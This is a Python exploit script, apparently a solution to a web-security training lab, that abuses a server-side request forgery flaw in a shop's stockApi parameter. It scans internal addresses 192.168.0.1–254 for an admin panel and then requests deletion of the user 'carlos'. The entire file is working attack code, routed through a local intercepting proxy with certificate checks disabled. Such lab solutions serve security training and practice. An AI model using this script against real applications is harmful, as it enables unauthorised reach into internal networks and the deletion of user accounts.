import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxy = {'http': 'http://127.0.0.1:8080', "https": "http://127.0.0.1:8080"}


def access_admin_page(session, url):
    api_url = ""
    found = False
    print("[*] Scanning for admin interface in the internal network ...")
    for i in range(1, 255):
        data = {"stockApi": f"http://192.168.0.{i}:8080/admin", "storeId": "1"}
        admin_page = session.post(url=url + '/product/stock',
                                  data=data,
                                  proxies=proxy,
                                  verify=False)

        if admin_page.status_code == 200:
            api_url = f"http://192.168.0.{i}:8080/admin"
            print(f"[*] Admin interface was found at http://192.168.0.{i}")
            found = True
            break
    if not found:
        print("[*] Couldn't find an admin interface, make sure you used the correct host")
        exit(-1)

    print("[*] Deleting Carlos's account ...")
    data = {"stockApi": api_url + "/delete?username=carlos", "storeId": 1}
    delete_carlos = session.post(url=url + "/product/stock",
                                 data=data,
                                 verify=False,
                                 proxies=proxy)
    if delete_carlos.status_code == 200:
        print("[*] Carlos's account was deleted successfully")
        print("[*] Lab Solved!!")
    else:
        print("[*] Couldn't delete Carlos's account")
        print("[*] Exploit failed")


def main():
    if len(sys.argv) != 2:
        print("[*] Wrong tool Usage!")
        print(f"[*] Usage {sys.argv[0]} <url>")
        print(f"[*] Example {sys.argv[0]} https://example.com ")
        sys.exit(-1)
    else:
        session = requests.Session()

        access_admin_page(session, sys.argv[1])


if __name__ == "__main__":
    main()
